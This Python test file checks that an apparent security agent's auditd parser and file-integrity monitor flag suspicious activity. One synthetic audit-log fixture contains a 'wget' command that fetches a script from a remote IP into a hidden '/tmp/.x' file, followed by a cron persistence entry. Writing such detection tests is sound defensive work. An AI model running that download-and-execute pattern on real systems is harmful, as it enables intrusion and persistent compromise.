from pathlib import Path

from aegis_agent.collectors.auditd import collect_auditd_events
from aegis_agent.collectors.fim import collect_fim_events


def test_auditd_parser_emits_suspicious_process_file_and_persistence(tmp_path: Path):
    audit = tmp_path / "audit.log"
    audit.write_text(
        'type=SYSCALL msg=audit(1783142470.100:420): arch=c000003e syscall=59 success=yes ppid=2222 pid=3333 auid=1001 uid=33 comm="sh" exe="/usr/bin/dash"\n'
        'type=EXECVE msg=audit(1783142470.100:420): argc=4 a0="/bin/sh" a1="-c" a2="wget http://45.77.1.2/x.sh -O /tmp/.x"\n'
        'type=PATH msg=audit(1783142470.100:420): item=0 name="/tmp/.x" nametype=CREATE\n'
        'type=SYSCALL msg=audit(1783142475.200:421): arch=c000003e syscall=2 success=yes ppid=3335 pid=3335 uid=33 comm="sh" exe="/tmp/.x"\n'
        'type=PATH msg=audit(1783142475.200:421): item=0 name="/etc/cron.d/aegis-test" nametype=CREATE\n',
        encoding="utf-8",
    )
    events = collect_auditd_events([str(audit)])
    types = [e.event_type for e in events]
    assert "suspicious_process" in types
    assert "suspicious_file" in types
    assert "persistence_modified" in types
    assert any(e.pid == 3333 for e in events if e.event_type == "suspicious_process")


def test_fim_baseline_then_detects_suspicious_file_create(tmp_path: Path):
    watched = tmp_path / "watched"
    watched.mkdir()
    state = tmp_path / "state"
    assert collect_fim_events([str(watched)], state_dir=str(state), first_run_baseline=True) == []
    f = watched / "payload.sh"
    f.write_text("#!/bin/sh\necho test\n", encoding="utf-8")
    f.chmod(0o755)
    events = collect_fim_events([str(watched)], state_dir=str(state), first_run_baseline=True)
    assert events
    assert events[0].event_type == "suspicious_file"
    assert events[0].metadata["fim_op"] == "create"
